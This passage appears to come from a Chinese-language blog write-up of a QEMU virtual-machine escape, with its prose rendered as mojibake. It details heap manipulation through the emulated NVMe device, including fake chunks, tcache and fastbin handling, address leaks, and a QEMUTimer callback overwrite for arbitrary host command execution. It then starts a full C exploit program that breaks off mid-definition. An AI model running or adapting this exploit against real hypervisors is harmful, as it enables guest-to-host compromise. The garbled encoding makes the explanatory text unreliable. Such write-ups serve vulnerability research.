†å†…å­˜çš„å¤§å°ä¸º<code>0xa0 * sq-&gt;size</code>ï¼Œå°†ä¹‹å‰é‡Šæ”¾çš„mapping tableé‡æ–°å¾—åˆ°ã€‚</li><li>ä¼ªé€ chunkå¤§å°ä¸º0x290ï¼Œé€šè¿‡æ¼æ´å‡½æ•°ç›´æ¥é‡Šæ”¾æ‰è™šæ‹Ÿæœºçš„å†…å­˜ï¼Œåœ¨ä¼ªé€ chunkçš„fdåŒºåŸŸå¯ä»¥æ³„æ¼å †åœ°å€ã€‚</li><li>æ¥ä¸‹æ¥å»æ³„æ¼qemuä¸­åˆ†é…ç»™è™šæ‹Ÿæœºå†…å­˜ï¼Œé€šè¿‡virtqueue_split_popå‡½æ•°ä¸­çš„<code>elem = virtqueue_alloc_element(sz, out_num, in_num)</code>å¯ä»¥å¾—åˆ°ä¼ªé€ çš„chunkï¼Œvirtqueue_split_popå‡½æ•°ä¸­çš„dma_memory_mapå°±å¯ä»¥åœ¨ä¼ªé€ çš„chunkä¸­å†™å…¥ç›¸åº”åœ°å€ã€‚</li><li>å’Œä¹‹å‰ä¸€æ ·ç»§ç»­æ„é€ mapping tableï¼Œä¼ªé€ chunkå¤§å°ä¸º0x40ï¼Œä½¿ç”¨æ¼æ´å‡½æ•°é‡Šæ”¾è™šæ‹Ÿæœºçš„å†…å­˜ï¼›ä»ç„¶æ˜¯åˆ›å»ºä¸€ä¸ªsq ï¼Œåœ¨nvme_init_sqä¸­æœ‰<code>sq-&gt;timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, nvme_process_sq, sq)</code>åˆ›å»ºæ—¶é—´å‡½æ•°ï¼Œtimerå°±æ˜¯ä½¿ç”¨0x40å¤§å°çš„chunkï¼Œä»è€Œä½¿ç”¨ä¼ªé€ çš„chunkã€‚</li><li>ä¼ªé€ çš„chunkä¸­å­˜åœ¨ä¸€ä¸ªQEMUTimerç»“æ„ä½“ï¼Œå¯ä»¥æ³„æ¼nvme_process_sqå‡½æ•°åœ°å€å¾—åˆ°qemuçš„åŸºåœ°å€ï¼Œæœ€åä¿®æ”¹cbå’Œopaqueå°±èƒ½å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</li></ol><p>â€‹                    </p><p>è¿™é‡Œæœ‰ä¸ªè‡ªå·±åˆšå¼€å§‹å¤ç°æ—¶å¿½è§†çš„é—®é¢˜ï¼šåœ¨nvme_map_prpä¸­è¿›å…¥qemu_iovec_initå‡½æ•°åé€šè¿‡<code>g_new(struct iovec, alloc_hint)</code>ç”³è¯·å †å—ï¼Œç”³è¯·çš„å¤§å°è·Ÿalloc_hintæœ‰å…³ï¼›å¦‚æœç”³è¯·çš„chunkä¹Ÿæ­£å¥½æ˜¯0x40å¤§å°ï¼Œåœ¨æœ€åä¼ªé€ chunkå¤§å°ä¸º0x40é‡Šæ”¾ä»¥åï¼Œç”±äºä¹‹å‰å·²ç»è¢«qemu_iovec_initå‡½æ•°ç”³è¯·äº†ä¸€ä¸ªï¼Œ0x40çš„tcacheæ•°é‡å°±ä¼šå‡1ï¼Œä¼ªé€ çš„chunkå°±ä¼šè¿›å…¥0x40çš„tcacheä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_map_prp</span><span class="hljs-params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="hljs-type">uint64_t</span> prp1,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> prp2, <span class="hljs-type">uint32_t</span> len, NvmeCtrl *n)</span><br>&#123;<br>    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);<br>    trans_len = MIN(len, trans_len);<br>    <span class="hljs-type">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!prp1)) &#123;<br>        trace_nvme_err_invalid_prp();<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;<br>               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;<br>        qsg-&gt;nsg = <span class="hljs-number">0</span>;<br>        qemu_iovec_init(iov, num_prps);<br>        qemu_iovec_add(iov, (<span class="hljs-type">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);<br>    &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_iovec_init</span><span class="hljs-params">(QEMUIOVector *qiov, <span class="hljs-type">int</span> alloc_hint)</span><br>&#123;<br>    qiov-&gt;iov = g_new(<span class="hljs-keyword">struct</span> iovec, alloc_hint);<br>    qiov-&gt;niov = <span class="hljs-number">0</span>;<br>    qiov-&gt;nalloc = alloc_hint;<br>    qiov-&gt;size = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯QEMUTimerç»“æ„ä½“æ˜¯ç”±callocç”³è¯·çš„ï¼Œä¸ä¼šä»tcacheä¸­å–å‡ºchunkï¼Œåªè¦è®¾ç½®å¥½nvme_map_prpå‡½æ•°ä¸­lenï¼Œæ¥ä¸‹æ¥è°ƒç”¨qemu_iovec_initä¸­çš„<code>g_new(struct iovec, alloc_hint)</code>å¯ä»¥é¿å…ä¸Šè¿°æƒ…å†µ</p><img src="/img/22/Screenshot 2023-10-18 123922.png" style="zoom:67%;" /><p>â€‹                             </p><p>è¯´è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨ï¼Ÿå› ä¸ºæˆ‘ä¸€å¼€å§‹nvme_map_prpå‡½æ•°çš„lenå‚æ•°æ²¡è®¾ç½®å¥½ï¼Œå°±å‡ºç°ä¸Šé¢è¿™ç§æƒ…å†µï¼Œè€Œä¸”å½“æ—¶æˆ‘å¹¶æ²¡æœ‰çœ‹å‡ºé—®é¢˜å‡ºåœ¨å“ªã€‚</p><p>å½“æ—¶æˆ‘è¿˜é’ˆå¯¹è¿™ç§æƒ…å†µæƒ³äº†ä¸€ä¸ªæ–¹æ³•å»å®Œæˆåˆ©ç”¨ï¼šä¼ªé€ chunkçš„å¤§å°ä¸º0x50ï¼Œé‡Šæ”¾ä»¥åè¿›å…¥0x50å¤§å°çš„fastbinï¼Œåˆ©ç”¨nvme_init_sqå‡½æ•°ä¸­çš„<code>sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size)</code>å®ç°ä¸€ä¸ªå¤§sizeçš„å †åˆ†é…ï¼Œä¼ªé€ çš„chunkè¿›å…¥0x50å¤§å°çš„small binï¼Œå…ˆå‰å †å–·å·²ç»å°†0x40å¤§å°çš„small binæ¸…ç©ºï¼Œcallocç”³è¯·QEMUTimerç»“æ„ä½“å°†ç”±0x50å¤§å°çš„small binæä¾›</p><img src="/img/22/Screenshot 2023-10-18 135401.png" style="zoom: 67%;" /><p>è°ƒç”¨å®Œtimer_new_nsåå°±å¯ä»¥ç…§å¸¸åˆ©ç”¨äº†</p><img src="/img/22/Screenshot 2023-10-18 135521.png" style="zoom:80%;" /><p>è¿™é‡Œä¸ç›´æ¥è®©ä¼ªé€ çš„chunkè¿›å…¥unsorted binæ˜¯å› ä¸º<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4311">freeå‡½æ•°</a>ä¼šå¯¹chunkçš„åœ°å€è¿›è¡Œåˆ¤æ–­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br></code></pre></td></tr></table></figure><p>åæ¥ä»”ç»†çœ‹äº†qemu_iovec_initå‡½æ•°æ‰æ˜ç™½é—®é¢˜å‡ºåœ¨å“ªã€‚æŠŠç›¸åº”å‚æ•°è®¾ç½®å¥½ä»¥åå®Œå…¨ä¸ç”¨æ€ä¹ˆéº»çƒ¦ï¼Œå½“ç„¶æœ€åä¹Ÿè¦ä¿è¯0x40çš„tcacheçš„æ•°é‡ä¸º7ï¼Œå¦‚æœä¸å¤Ÿå°±é‡Šæ”¾ä¸€äº›sqæˆ–è€…cqï¼Œä¿è¯ä¼ªé€ çš„chunké‡Šæ”¾åè¿›å…¥åˆ°fastbinã€‚</p><p>â€‹            </p><p>å®Œæ•´exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> *mmio_nvme;<br><span class="hljs-type">void</span> *mmio_gpu;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">void</span> *nvme_buf;<br><span class="hljs-type">void</span> *desc_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span> *<span class="hljs-title">desc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span> *<span class="hljs-title">avail</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCmd</span> *<span class="hljs-title">nvme_cmd</span>;</span> <br><span class="hljs-type">int</span> sq_tail = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> vq_last_avail_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> exec_cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCmd</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     fuse;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    nsid;<br>    <span class="hljs-type">uint64_t</span>    res1;<br>    <span class="hljs-type">uint64_t</span>    mptr;<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    prp2;<br>    <span class="hljs-type">uint32_t</span>    cdw10;<br>    <span class="hljs-type">uint32_t</span>    cdw11;<br>    <span class="hljs-type">uint32_t</span>    cdw12;<br>    <span class="hljs-type">uint32_t</span>    cdw13;<br>    <span class="hljs-type">uint32_t</span>    cdw14;<br>    <span class="hljs-type">uint32_t</span>    cdw15;<br>&#125; NvmeCmd;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCreateCq</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    rsvd8;<br>    <span class="hljs-type">uint16_t</span>    cqid;<br>    <span class="hljs-type">uint16_t</span>    qsize;<br>    <span class="hljs-type">uint16_t</span>    cq_flags;<br>    <span class="hljs-type">uint16_t</span>    irq_vector;<br>    <span class="hljs-type">uint32_t</span>    rsvd12[<span class="hljs-number">4</span>];<br>&#125; NvmeCreateCq;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCreateSq</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    rsvd8;<br>    <span class="hljs-type">uint16_t</span>    sqid;<br>    <span class="hljs-type">uint16_t</span>    qsize;<br>    <span class="hljs-type">uint16_t</span>    sq_flags;<br>    <span class="hljs-type">uint16_t</span>    cqid;<br>    <span class="hljs-type">uint32_t</span>    rsvd12[<span class="hljs-number">4</span>];<br>&#125; NvmeCreateSq;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeRwCmd</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    nsid;<br>    <span class="hljs-type">uint64_t</span>    rsvd2;<br>    <span class="hljs-type">uint64_t</span>    mptr;<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    prp2;<br>    <span class="hljs-type">uint64_t</span>    slba;<br>    <span class="hljs-type">uint16_t</span>    nlb;<br>    <span class="hljs-type">uint16_t</span>    control;<br>    <span class="hljs-type">uint32_t</span>    dsmgmt;<br>    <span class="hljs-type">uint32_t</span>    reftag;<br>    <span class="hljs-type">uint16_t</span>    apptag;<br>    <span class="hljs-type">uint16_t</span>    appmask;<br>&#125; NvmeRwCmd;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeDeleteQ</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">9</span>];<br>    <span class="hljs-type">uint16_t</span>    qid;<br>    <span class="hljs-type">uint16_t</span>    rsvd10;<br>    <span class="hljs-type">uint32_t</span>    rsvd11[<span class="hljs-number">5</span>];<br>&#125; NvmeDeleteQ;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> flags;<br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">uint16_t</span> ring[];<br>&#125;VRingAvail;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint32_t</span> len;<br>    <span class="hljs-type">uint16_t</span> flags;<br>    <span class="hljs-type">uint16_t</span> next;<br>&#125; VRingDesc;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> &#123;</span><br><span class="hljs-type">uint32_t</span> type;<br><span class="hljs-type">uint32_t</span> flags;<br><span class="hljs-type">uint64_t</span> fence_id;<br><span class="hljs-type">uint32_t</span> ctx_id;<br><span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> <span class="hljs-title">hdr</span>;</span><br><span class="hljs-type">uint32_t</span> resource_id;<br><span class="hljs-type">uint32_t</span> nr_entries;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> <span class="hljs-title">hdr</span>;</span><br><span class="hljs-type">uint32_t</span> resource_id;<br><span class="hljs-type">uint32_t</span> format;<br><span class="hljs-type">uint32_t</span> width;<br><span class="hljs-type">uint32_t</span> height;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> &#123;</span><br><span class="hljs-type">uint64_t</span> addr;<br><span class="hljs-type">uint32_t</span> length;<br><span 